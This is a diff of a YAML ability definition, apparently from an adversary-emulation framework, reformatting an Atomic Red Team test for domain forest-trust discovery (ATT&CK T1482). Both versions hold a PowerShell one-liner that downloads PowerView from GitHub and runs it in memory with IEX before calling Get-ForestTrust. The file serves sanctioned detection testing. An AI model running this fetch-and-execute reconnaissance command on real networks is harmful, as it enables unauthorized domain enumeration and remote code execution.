@@ -1,13 +1,15 @@
-- id: dd3c3f85-af72-5f41-aeba-5a8791e0dd58
+- requirements: []
   name: Soumaia ART Tests - Get-ForestTrust with PowerView
   description: Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.
   tactic: discovery
-  technique:
-    attack_id: T1482
-    name: Domain Trust Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
+  technique_id: T1482
+  technique_name: Domain Trust Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'' -UseBasicParsing); Get-ForestTrust -Verbose'
+  id: dd3c3f85-af72-5f41-aeba-5a8791e0dd58
